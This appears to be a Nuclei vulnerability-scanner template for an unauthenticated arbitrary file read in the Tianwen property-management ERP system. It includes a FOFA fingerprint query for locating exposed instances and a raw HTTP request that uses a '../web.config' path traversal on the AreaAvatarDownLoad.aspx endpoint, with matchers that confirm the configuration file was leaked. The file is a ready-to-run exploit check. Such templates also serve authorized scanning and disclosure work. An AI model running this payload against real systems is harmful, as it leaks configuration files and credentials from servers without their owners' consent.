id: NPoc-7

info:
  name: 天问物业ERP系统AreaAvatarDownLoad存在任意文件读取漏洞
  author: pussycat0x
  severity: high
  description: |
    天问物业ERP系统 AreaAvatarDownLoad 接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
  tags: download
request:
 - raw:
      - |
        GET /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config HTTP/1.1
        Host: {{RootURL}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
   matchers-condition: and
   matchers:
      - type: word
        part: body
        words:
          - '<?xml version="1.0"'
          - 'applicationSettings'
        condition: and   